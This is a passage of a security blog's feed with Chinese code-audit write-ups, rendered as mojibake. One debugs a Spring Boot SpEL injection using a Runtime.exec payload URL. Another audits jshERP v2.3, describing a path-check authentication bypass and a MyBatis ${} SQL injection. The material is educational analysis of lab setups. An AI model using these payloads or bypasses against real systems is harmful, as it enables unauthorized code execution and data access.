class="markdownIt-Anchor" href="#0x02-ç¯å¢ƒæ­å»º">#</a> 0x02 ç¯å¢ƒæ­å»º</h1><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce</a></p><p>ç›´æ¥è¿è¡Œ</p><p>æ‰“å¼€æœ¬åœ° 9091 å³å¯</p><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221515517.png" alt="image-20230522151544480"></p><h1 id="0x03-æ¼æ´åˆ†æ"><a class="markdownIt-Anchor" href="#0x03-æ¼æ´åˆ†æ">#</a> 0x03 æ¼æ´åˆ†æ</h1><p>éšä¾¿æ‰“ä¸ªæ–­ç‚¹</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221515995.png" alt="image-20230522151557905"></p><p>å¾€ä¸‹è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221516781.png" alt="image-20230522151611575"></p><p>è¿™é‡Œæ•è·åˆ° web ç«¯çš„å¼‚å¸¸ä¿¡æ¯ï¼Œåˆ¤æ–­ <code>targetException</code>  æ˜¯ <code>RuntimeException</code>  ç±»çš„å¯¹è±¡ï¼Œå°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹èµ‹å€¼ç»™äº† <code>targetException</code></p><p>ç»è¿‡åˆ†æ”¯ï¼ŒThrowable æå–ä¿å­˜åœ¨å †æ ˆä¸­çš„é”™è¯¯ä¿¡æ¯ã€‚</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221516718.png" alt="image-20230522151623665"></p><p>åé¢éƒ½æ˜¯ä¸€äº›æ— å…³ç´§è¦çš„ã€‚ã€‚ã€‚</p><p>ç›´æ¥å°†æ–­ç‚¹æ‰“åœ¨</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221516074.png" alt="image-20230522151635974"></p><p>è¿™é‡Œæ˜¯è°ƒç”¨ SpEL è§£æå™¨æ¥è§£æä¸Šä¸‹æ–‡å†…å®¹</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221516935.png" alt="image-20230522151649905"></p><p>å¯ä»¥çœ‹åˆ°æœ‰æŠ¥é”™çš„ç±»ï¼Œè·¯å¾„ï¼ŒæŠ¥é”™ç±»å‹ã€è¾“å…¥å†…å®¹ï¼Œäº‹ä»¶å’ŒçŠ¶æ€ç </p><p>æ ¹æ®ä¸Šé¢çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹ <code>message</code>  å³å¯ï¼Œ <code>timestamp</code>  å’Œ <code>status</code>  å¯ä»¥ç›´æ¥è·³è¿‡</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517944.png" alt="image-20230522151707822"></p><p>è·Ÿè¿› <code>getValue</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517046.png" alt="image-20230522151718932"></p><p>ç¬¬ä¸€æ­¥å’Œä¸Šé¢ä¸€æ ·ï¼Œéƒ½æ˜¯è°ƒç”¨ SpEL è§£æå™¨æ ¹æ®ä¸Šä¸‹æ–‡æ¥è§£æå†…å®¹</p><p>è¿™é‡Œæ˜¯å·²ç»ç¼–è¯‘äº†ï¼Œæœª <code>false</code> ï¼Œè·³è¿‡ <code>if</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517047.png" alt="image-20230522151726835"></p><p>è¿™é‡Œåˆ©ç”¨æ ‡å‡†è¯„ä¼°ä¸Šä¸‹æ–‡å¯¹è±¡ StandardEvaluationContext æ¥å¯¹æŠ½è±¡è¯­æ³•æ ‘è¿›è¡Œè§£æï¼Œå®é™…æ˜¯ä¸€ä¸ªæ·±åº¦ä¼˜å…ˆæœç´¢çš„è®¡ç®—è¿‡ç¨‹ï¼Œæœ€ç»ˆè¿”å›æ•´ä¸ªè¡¨è¾¾å¼çš„è®¡ç®—ç»“æœï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionState</span> <span class="variable">expressionState</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionState</span>(context, <span class="built_in">this</span>.configuration);</span><br><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.ast.getValue(expressionState);</span><br><span class="line">checkCompile(expressionState);</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>è·å–è¾“å…¥çš„å†…å®¹å¹¶è°ƒç”¨ <code>toString</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517570.png" alt="image-20230522151736503"></p><p>æ¥ç€è·Ÿè¿›åˆ°è¿™é‡Œ</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517379.png" alt="image-20230522151749339"></p><p>å…¶ä¸­ <code>placeholder</code>  æ‹¿åˆ°å€¼ <code>message</code> ï¼Œ <code>proval</code>  ä¸º <code>payload</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221517119.png" alt="image-20230522151758072"></p><p>å¹¶è°ƒç”¨ <code>StringBuilder</code>  æ¥å¤„ç†ä¿®æ”¹æˆ‘ä»¬çš„ <code>payload</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221518257.png" alt="image-20230522151805129"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> strVal.indexOf(<span class="built_in">this</span>.placeholderPrefix);</span><br></pre></td></tr></table></figure><p>è·å– <code>payload</code>  çš„å‰ç¼€ <code>$&#123;</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221518906.png" alt="image-20230522151812827"></p><p>è¿›å…¥ <code>while</code>  åï¼Œå®šä¹‰äº† <code>endIndex</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">endIndex</span> <span class="operator">=</span> findPlaceholderEndIndex(result, startIndex);</span><br></pre></td></tr></table></figure><p>æ¥çœ‹ä¸‹ <code>findPlaceholderEndIndex</code>  æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">findPlaceholderEndIndex</span><span class="params">(CharSequence buf, <span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> startIndex + <span class="built_in">this</span>.placeholderPrefix.length();</span><br><span class="line"><span class="type">int</span> <span class="variable">withinNestedPlaceholder</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (index &lt; buf.length()) &#123;</span><br><span class="line"><span class="keyword">if</span> (StringUtils.substringMatch(buf, index, <span class="built_in">this</span>.placeholderSuffix)) &#123;</span><br><span class="line"><span class="keyword">if</span> (withinNestedPlaceholder &gt; <span class="number">0</span>) &#123;</span><br><span class="line">withinNestedPlaceholder--;</span><br><span class="line">index = index + <span class="built_in">this</span>.placeholderSuffix.length();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (StringUtils.substringMatch(buf, index, <span class="built_in">this</span>.simplePrefix)) &#123;</span><br><span class="line">withinNestedPlaceholder++;</span><br><span class="line">index = index + <span class="built_in">this</span>.simplePrefix.length();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">index++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šå›¾å¯çŸ¥ï¼Œint index ä¹Ÿå°±ç­‰äº 24+2=26</p><p>æ˜¾ç„¶ <code>index&lt;buf.length()</code> ï¼Œè¿›å…¥ while å¾ªç¯</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221518993.png" alt="image-20230522151821848"></p><p>æ¥ç€ä¼šéå†å­—ç¬¦ä¸²æ˜¯å¦ä¸ºåç¼€ &quot;}&quot;ï¼Œä» index=26 å¼€å§‹</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221518138.png" alt="image-20230522151832032"></p><p>ä¼¼ä¹åˆ° 109 å°±ç»“æŸäº†</p><p>ä¸‹ä¸€æ­¥</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221522738.png" alt="img"></p><p>è¿™é‡Œ <code>For input string: &amp;quot;</code>  æ˜¯ 24ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">placeholder</span> <span class="operator">=</span> result.substring(startIndex + <span class="built_in">this</span>.placeholderPrefix.length(), endIndex);</span><br></pre></td></tr></table></figure><p>æ¢å¥è¯è¯´ä¹Ÿå°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">placeholder</span> <span class="operator">=</span> result.substring(<span class="number">24</span> + <span class="number">2</span>, <span class="number">109</span>);</span><br></pre></td></tr></table></figure><p>æ¢è¨€ä¹‹</p><p>ä¹Ÿå°±æ˜¯å°† ${} ä¸­çš„å†…å®¹æå–å‡ºæ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>&#125;))</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221522835.png" alt="image-20230522152224788"></p><p>å¹¶å°†å…¶èµ‹å€¼ç»™ <code>originalPlaceholder</code></p><p>é‡å†™çš„ <code>resolvePlaceholder</code>  å¤„ç† <code>name</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221522289.png" alt="image-20230522152232137"></p><p>è¿˜æ˜¯åŒæ ·çš„ <code>getValue</code></p><p>è·å–ä¸Šä¸‹æ–‡å’Œ <code>Expression</code></p><p>å¹¶ç¼–è¯‘è¡¨è¾¾å¼</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221522622.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;0x01-spelè¡¨è¾¾å¼åŸºç¡€&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01-spelè¡¨è¾¾å¼åŸºç¡€&quot;&gt;#&lt;/a&gt; 0x01 SpEL è¡¨è¾¾å¼åŸºç¡€&lt;/h1&gt;
&lt;h3 id=&quot;spelç®€ä»‹&quot;&gt;&lt;a class</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>åå¤ERP-ä»£ç å®¡è®¡</title>
    <link href="https://ki10moc.github.io/2023/03/09/%E5%8D%8E%E5%A4%8FERP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://ki10moc.github.io/2023/03/09/%E5%8D%8E%E5%A4%8FERP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-03-09T13:09:36.000Z</published>
    <updated>2024-06-08T15:14:10.244Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="0x01ç¯å¢ƒæ­å»º"><a class="markdownIt-Anchor" href="#0x01ç¯å¢ƒæ­å»º">#</a> 0x01 ç¯å¢ƒæ­å»º</h1><p><a href="https://github.com/jishenghua/jshERP/releases/tag/2.3">Release åå¤ ERP_v2.3ãƒ»jishenghua/jshERPãƒ»GitHub</a></p><p>è¿æ•°æ®åº“ï¼Œæ”¹ç«¯å£ï¼Œç›´æ¥ run</p><h1 id="0x02ä»£ç å®¡è®¡"><a class="markdownIt-Anchor" href="#0x02ä»£ç å®¡è®¡">#</a> 0x02 ä»£ç å®¡è®¡</h1><h2 id="filterè¿‡æ»¤å™¨"><a class="markdownIt-Anchor" href="#filterè¿‡æ»¤å™¨">#</a> Filter è¿‡æ»¤å™¨</h2><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230512154239040.png" alt="image-20230512154239040"></p><ul><li>ignoredUrlï¼šè¡¨ç¤ºè¢«å¿½ç•¥çš„ URL çš„æ¨¡å¼ï¼Œå®ƒä½¿ç”¨ # åˆ†éš”äº†ä¸€äº›åç¼€åï¼Œå¦‚ .cssã€.jsã€.jpgã€.pngã€.gifã€.icoï¼Œè¿™äº›åç¼€åçš„ URL å°†ä¸ä¼šè¢« LogCostFilter è¿‡æ»¤ã€‚</li><li>filterPathï¼šè¡¨ç¤ºéœ€è¦è¿‡æ»¤çš„ URL çš„æ¨¡å¼ï¼Œå®ƒä½¿ç”¨ # åˆ†éš”äº†ä¸€äº›éœ€è¦è¿‡æ»¤çš„ URLï¼Œå¦‚ /user/loginã€/user/registerUserã€/v2/api-docs ç­‰ã€‚</li></ul><p>æ¥ç€æ˜¯åˆå§‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filterPath</span> <span class="operator">=</span> filterConfig.getInitParameter(FILTER_PATH);</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;</span><br><span class="line">            allowUrls = filterPath.contains(<span class="string">&quot;#&quot;</span>) ? filterPath.split(<span class="string">&quot;#&quot;</span>) : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;filterPath&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ignoredPath</span> <span class="operator">=</span> filterConfig.getInitParameter(IGNORED_PATH);</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.isEmpty(ignoredPath)) &#123;</span><br><span class="line">            ignoredUrls = ignoredPath.contains(<span class="string">&quot;#&quot;</span>) ? ignoredPath.split(<span class="string">&quot;#&quot;</span>) : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;ignoredPath&#125;;</span><br><span class="line">            <span class="keyword">for</span> (String ignoredUrl : ignoredUrls) &#123;</span><br><span class="line">                ignoredList.add(ignoredUrl);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·å–ä¸¤ä¸ªå‚æ•°ãƒ» <code>*FILTER_PATH*</code>  å’Œ <code>*IGNORED_PATH*</code> ï¼Œæ£€ç´¢å…¶æ˜¯å¦æœ‰ #ï¼Œå¹¶åˆ†ç¦»ç„¶åå­˜å…¥æ•°ç»„</p><p>å†æ¥çœ‹ä¸‹ <code>doFilter</code>  å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯æ¥çœ‹ Filter` è¿‡æ»¤å™¨å®é™…çš„ä½œç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">                         FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestUrl</span> <span class="operator">=</span> servletRequest.getRequestURI();</span><br><span class="line">        <span class="comment">//å…·ä½“ï¼Œæ¯”å¦‚ï¼šå¤„ç†è‹¥ç”¨æˆ·æœªç™»å½•ï¼Œåˆ™è·³è½¬åˆ°ç™»å½•é¡µ</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">userInfo</span> <span class="operator">=</span> servletRequest.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(userInfo!=<span class="literal">null</span>) &#123; <span class="comment">//å¦‚æœå·²ç™»å½•ï¼Œä¸é˜»æ­¢</span></span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (requestUrl != <span class="literal">null</span> &amp;&amp; (requestUrl.contains(<span class="string">&quot;/doc.html&quot;</span>) ||</span><br><span class="line">            requestUrl.contains(<span class="string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="string">&quot;/login.html&quot;</span>))) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (verify(ignoredList, requestUrl)) &#123;</span><br><span class="line">            chain.doFilter(servletRequest, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String url : allowUrls) &#123;</span><br><span class="line">                <span class="keyword">if</span> (requestUrl.startsWith(url)) &#123;</span><br><span class="line">                    chain.doFilter(request, response);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        servletResponse.sendRedirect(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç†è§£èµ·æ¥ä¹Ÿæ¯”è¾ƒç®€å•</p><p>é¦–å…ˆæ˜¯åˆå§‹åŒ–çš„ä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªè¯·æ±‚ä¸€ä¸ªç›¸åº”ï¼Œ <code>requestUrl</code>  è·å–è¯·æ±‚çš„ <code>Url</code></p><p>ç¬¬ä¸€ä¸ª if</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åè¯»å–`Session`è·å–ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">å¦‚æœæ˜¯ç™»å½•çŠ¶æ€åˆ™æ”¾è¡Œ</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ª if</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœUrlä¸ä¸ºç©ºå°±åˆ¤æ–­æ˜¯å¦åŒ…å«&quot;/doc.html&quot;,&quot;/register.html&quot;å’Œ&quot;/login.html&quot;</span><br><span class="line">å¦‚æœåŒ…å«å°±æ”¾è¡Œ</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ä¸ª if</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨`verify`å‡½æ•°ï¼Œå®é™…ä¸Šå°±æ˜¯æ¥æ£€æµ‹`Url`æ˜¯å¦æ˜¯å¯å¿½è§†`Url`</span><br><span class="line">å¦‚æœæ˜¯åˆ™æ”¾è¡Œ</span><br></pre></td></tr></table></figure><p>ç¬¬å››ä¸ª if</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœå…è®¸Urlæ•°ç»„ä¸ä¸ºç©ºï¼Œåˆ™æ£€ç´¢Urlæ˜¯å¦åœ¨å…è®¸åˆ—è¡¨</span><br><span class="line">å¦‚æœæ˜¯åˆ™æ”¾è¡Œ</span><br></pre></td></tr></table></figure><p>å¦åˆ™è·³è½¬åˆ°ç™»å½•ç•Œé¢</p><p>å¯ç›´æ¥è®¿é—®å¿½ç•¥çš„ urlpath</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230512170907517.png" alt="image-20230512170907517"></p><p>é‚£ä¹ˆè¿™é‡Œè€ƒè™‘ä¸¤ä¸ªé—®é¢˜ï¼Œå®é™…æ˜¯ä¸€ä¸ªé—®é¢˜</p><p>ä¹Ÿå°±æ˜¯ Filter æ”¾è¡Œçš„ä¸¤ä¸ªæ•°ç»„åå•ï¼Œä¸€ä¸ªå¿½ç•¥çš„ä¸€ä¸ªç™½åå•</p><p>ç¬¬ä¸€</p><p>å…¶ä¸­å¯¹ <code>*ignoredList*</code>  çš„åˆ¤æ–­æ˜¯é€šè¿‡ä¸€ä¸ª <code>verify</code>  å‡½æ•°ï¼Œ</p><p>ç›¸å½“äºåªåŒ¹é… <code>regex</code>  è€Œä¸é¡¾åŠå‰åç¼€</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230512173140932.png" alt="image-20230512173140932"></p><p>è¿™é‡Œåº”è¯¥ä½¿ç”¨ <code>endsWith()</code>  æ¥åˆ¤æ–­èµ„æºçš„åç¼€ä¸º jsã€css ç­‰</p><p>ç¬¬äºŒ</p><p>ç™½åå•çš„åˆ¤æ–­é€šè¿‡ <code>startsWith()</code>  çš„è¯</p><p>æ˜¯å¯ä»¥é€šè¿‡ç›®å½•ç©¿è¶Šæ¥é¥¶è¿‡è®¤è¯</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230512173314096.png" alt="image-20230512173314096"></p><p>å¦å¤–å¦‚æœ <code>Url</code>  ä¸­å­˜åœ¨ /doc.htmlï¼Œ/register.htmlï¼Œ/login.html åŒæ ·ä¹Ÿä¼šæ”¾è¡Œï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è¿›è¡Œç»•è¿‡</p><h2 id="é‰´æƒç»•è¿‡"><a class="markdownIt-Anchor" href="#é‰´æƒç»•è¿‡">#</a> é‰´æƒç»•è¿‡</h2><p>å‰é¢æˆ‘ä»¬è¯´äº† <code>Filter</code>  æ‹¦æˆªå™¨çš„å¤„ç†è§„åˆ™</p><p>å½“ <code>Url</code>  ä¸­å­˜åœ¨ /doc.htmlï¼Œ/register.htmlï¼Œ/login.html çš„æ—¶å€™å°±ä¼šç›´æ¥æ”¾è¡Œ</p><p><img src="C:%5CUsers%5Cki10Moc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230519163611007.png" alt="image-20230519163611007"></p><p>è¿™é‡Œæ²¡æœ‰ sessionï¼Œå°±ä¼šé‡å®šå‘åˆ° login.html ç•Œé¢</p><h2 id="sqlæ³¨å…¥"><a class="markdownIt-Anchor" href="#sqlæ³¨å…¥">#</a> SQL æ³¨å…¥</h2><p>å…¨å±€æœç´¢ <code>$&#123;</code></p><p>æ¥åˆ° <code>UserMaooerEx.xml</code></p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517195937230.png" alt="image-20230517195937230"></p><p>å…¨å±€æœç´¢ <code>selectByConditionUser</code></p><p>åˆ° <code>UserMapperEx</code>  çš„æ¥å£</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517200021735.png" alt="image-20230517200021735"></p><p>æ¥ç€å…¨å±€æœç´¢æˆ–è€…æŸ¥æ‰¾å¼•ç”¨</p><p>åˆ° <code>UsserService</code>  çš„ java æ–‡ä»¶</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517200133414.png" alt="image-20230517200133414"></p><p>æ¥åˆ° <code>UserComponent</code></p><p>æ¥ç€æ‰¾å“ªé‡Œè°ƒç”¨äº† <code>UserService.select</code>  æ–¹æ³•</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517200820484.png" alt="image-20230517200820484"></p><p>è¿™é‡Œé€šè¿‡ <code>search</code>  å­—æ®µè·å– <code>userName</code>  å’Œ <code>loginName</code>  å¹¶ä¸”å¯æ§</p><p>åœ¨ <code>CommonQueryManager</code>  ä¸‹è°ƒç”¨</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230518224148428.png" alt="image-20230518224148428"></p><p>æ¥ç€æ¥åˆ° <code>ResourceController</code></p><p>è¿™é‡Œåˆ°äº† contoller å±‚å°±å¯ä»¥çœ‹å‰ç«¯è·å–æ•°æ®äº†</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230518224236337.png" alt="image-20230518224236337"></p><p>åˆ°ç”¨æˆ·ç®¡ç†ç•Œé¢è¿›è¡ŒéªŒè¯</p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517173521606.png" alt="image-20230517173521606"></p><p><img src="http://rtd6qa0cy.bkt.gdipper.com/image-20230517173309096.png" alt="image-20230517173309096"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x01ç¯å¢ƒæ­å»º&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01ç¯å¢ƒæ­å»º&quot;&gt;#&lt;/a&gt; 0x01 ç¯å¢ƒæ­å»º&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/jishenghua/</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>æµ…æC3P0æ”»å‡»é“¾</title>
    <link href="https://ki10moc.github.io/2023/03/09/%E6%B5%85%E6%9E%90C3P0%E6%94%BB%E5%87%BB%E9%93%BE/"/>
    <id>https://ki10moc.github.io/2023/03/09/%E6%B5%85%E6%9E%90C3P0%E6%94%BB%E5%87%BB%E9%93%BE/</id>
    <published>2023-03-09T13:09:36.000Z</published>
    <updated>2023-10-22T08:09:52.000Z</updated>
    
